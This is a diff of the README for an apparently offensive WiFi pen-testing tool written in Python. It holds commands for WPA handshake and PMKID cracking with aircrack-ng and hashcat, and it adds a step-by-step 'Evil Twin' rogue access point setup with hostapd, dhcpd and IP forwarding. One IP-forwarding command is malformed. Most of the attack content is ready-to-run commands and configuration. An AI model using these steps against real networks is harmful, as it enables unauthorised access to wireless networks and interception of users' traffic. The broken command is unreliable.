@@ -6,10 +6,8 @@ Easy-to-use WiFI pen-testing/scanning tool written in python
 
 **Dependencies**
 ```sh
-sudo zypper in python3 aircrack-ng hashcat ...
-
+sudo zypper in python3 aircrack-ng ...
 ```
-- REAVER: githubproject
 
 **Creating python virtual enviroment**
 
@@ -54,20 +52,18 @@ sudo ./wifighter.py
 
 ## Attacking
 - wps cracking (testing)
-- PMKID cracking (testing)
-- monitor start --interfaces-- listen --channel--
+- monitor start listen command error still switches the NIC to monitor
 
 
 ## Future visions
-- mazat prazdne/nechycene handshaky z attacks
-- Utilize hashcat & xctools - HW acc. cracking & generating wordlists, conversions?
 - vyber vice wordlistu najednou?
+- Utilize hashcat & xctools - HW acc. cracking & generating wordlists, conversions?
 
 ## REMEMBER !!
 - create requirements.txt
-- add time.sleep after monitor switch before attacking
 
 - dependencies a install script
+
 
 
 ### 1. WPA/WPA2 Handshake Crack
@@ -137,20 +133,6 @@ sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
 ```
 
 
-### WPS Attack - Reaver
-Dependencies
-```sh
-sudo zypper in aircrack-ng
-```
-```sh
-pixiewps - GitHub
-```
-```sh
-libpcap - Repo
-```
-Installation
-
-
 ### PMKID Attack
 Compile needed hcxtools & install it's dependencies
 ```sh
@@ -194,3 +176,85 @@ Crack the PMKID
 sudo hashcat -D 1 -a 0 -m 22000 <PMKID_HASH_FILE> <WORDLIST> -o <OUTPUT_FILE>
 ```
 
+
+### Evil Twin
+Install dependencies
+```sh
+sudo zypper in hostapd dhcp-server iptables
+```
+
+Set dhcp server listenning interface
+```sh
+nano /etc/sysconfig/dhcpd 
+
+DHCPD_INTERFACE="<LISTEN_INTRFACE>"
+```
+
+Set dhcp server configuration
+```sh
+nano /etc/dhcpd.conf
+```
+```sh
+option domain-name "local";
+option domain-name-servers 8.8.8.8, 8.8.4.4;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.100.0 netmask 255.255.255.0 {
+    range 192.168.100.2 192.168.100.254;
+    option subnet-mask 255.255.255.0;
+    option broadcast-address 192.168.100.255;
+}
+```
+
+Set Fake AP configuration
+```sh
+nano /etc/hostapd.conf
+```
+```sh
+interface=wlp99s0f3u2
+driver=nl80211
+
+ssid=Fake_AP
+channel=1
+
+hw_mode=g
+ieee80211n=1
+wme_enabled=1
+macaddr_acl=0
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=81203666
+rsn_pairwise=CCMP
+```
+
+Configure fake AP interface
+```sh
+sudo ip addr add 192.168.100.1/24 dev <INTERFACE>
+route add -net 192.168.100.0 netmask 255.255.255.0 gw 192.168.100.1
+```
+
+Enable internet connection for clients
+```sh
+sudo tee | echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+Start the fake AP
+```sh
+systemctl restart dhcpd
+systemctl restart hostapd
+```
+
+
+
+### WPS Attack - Reaver
+Dependencies
+```sh
+sudo zypper in aircrack-ng
+```
+```sh
+pixiewps - GitHub
+```
+```sh
+libpcap - Repo
+```
